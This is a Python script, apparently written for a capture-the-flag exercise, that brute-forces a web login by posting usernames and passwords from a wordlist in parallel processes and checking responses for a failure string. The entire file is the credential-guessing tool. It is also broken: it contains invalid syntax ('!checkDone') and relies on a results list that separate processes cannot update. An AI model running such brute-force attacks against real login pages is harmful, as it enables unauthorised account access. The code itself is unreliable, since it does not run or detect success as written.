'''
A multithreaded password bruteforce script which I wrote for a CTF, I think
'''

import sys
import requests
import multiprocessing


def loadParams(s):
    items=s.split("&")
    parts=[]
    varName=""
    value=""
    pwIx=-1
    ret=[]
    for item in items:
        parts=item.split("=")
        varName=parts[0]
        value=parts[1]
        ret.append([varName,value])
    return ret

def processParams(lst,user,password):
    for x in lst:
        if(x[1]=='^USER^'):
            x[1]=user
        elif(x[1]=='^PASS^'):
            x[1]=password


def loadPwordList(path):
    f=open(path,"r")
    dat=f.read().strip()
    #print(dat)
    if(dat!=""):
        return dat.split("\n")
    else: 
        return []



def doOnce(instanceIx,user,pw,paramList,bad,found):
        print(instanceIx,"Trying username=",user,"password=",pw) 
        processParams(paramList,user,pw)
        p=requests.post(addr,paramList).text
        print(p)
        if(p.find(bad)==-1):
            print("Found:password=",pw)
            found[instanceIx]=True
        else:
            found[instanceIx]=False

def checkDone(l):
    for x in l:
        if(x):
            return x
    return False

def doAttack(addr,user,pws,pL,bad,numIns):
    processes=[None]*numIns
    rets=[False]*numIns
    pwCounter=0
    numPws=len(pws)
    found=False
    
    while(pwCounter<numPws-numIns and not found):
        #print("HERE")
        for i in range(0,numIns):
            processes[i]=multiprocessing.Process(target=doOnce,args=(i,user,pws[pwCounter+i],pL,bad,rets,))
            processes[i].start()
        for proc in processes:
            proc.join()
            
        #Check if found
        found=checkDone(rets)
        
        pwCounter+=numIns
        
        
        
        
    #print(pwCounter)    
    #Do remaining
    rets=[False]*(numPws-pwCounter)
    processes=[None]*(numPws-pwCounter)
   # print(processes)
    #print("Now here")
    for i in range(0,numPws-pwCounter):
        processes[i]=multiprocessing.Process(target=doOnce,args=(i,user,pws[pwCounter+i],pL,bad,rets,))
        processes[i].start()
    for proc in processes:
        proc.join()
    
    if(!checkDone(rets)):
        print("Nothing found :(")
        

addr=sys.argv[1]
user=sys.argv[2]
pwlist=loadPwordList(sys.argv[3])
paramList=loadParams(sys.argv[4])
bad=sys.argv[5]
nums=sys.argv[6]
if(len(pwlist)!=0):
    doAttack(addr,user,pwlist,paramList,bad,int(nums))
else:
    print("Empty passsword file!")

#def doAttack():
      
